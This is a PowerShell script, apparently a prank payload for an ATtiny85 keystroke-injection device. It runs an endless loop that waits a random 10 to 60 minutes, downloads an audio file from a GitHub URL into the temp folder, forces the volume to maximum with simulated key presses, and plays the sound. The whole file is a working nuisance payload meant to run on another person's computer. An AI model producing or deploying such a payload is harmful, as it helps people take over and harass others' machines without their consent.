$URL = "https://raw.githubusercontent.com/msr8/attiny85/main/Assets/yamete-kudasai.wav"
$FP  = "$env:TEMP\15791817.wav"
$MINTIME = 600  # 10 minutes
$MAXTIME = 3600 # 1 hour


# Infinite loop
# https://deangrant.me/2013/12/11/create-infinite-loop-in-powershell/
while ($true) {
    # Get a random number between $MINTIME and $MAXTIME
    # https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-random
    $waitTime = Get-Random -Minimum $MINTIME -Maximum $MAXTIME

    # Wait/Sleep for that random amount of seconds
    # https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/start-sleep
    Start-Sleep -Seconds $waitTime

    # Check if the audio file does not exist
    # https://stackoverflow.com/a/31880042/17002774
    if (!(Test-Path $FP)) {
        # Download the audio file and save it in the temporary directory
        # https://stackoverflow.com/a/51225744/17002774
        Invoke-WebRequest $URL -OutFile $FP
    }

    # Change volume to full
    $wshShell = New-Object -ComObject WScript.Shell
    1..50 | ForEach-Object { $wshShell.SendKeys([char]175) }

    # Play the audio file
    # https://stackoverflow.com/a/73538809/17002774
    (New-Object System.Media.SoundPlayer($FP)).PlaySync()
}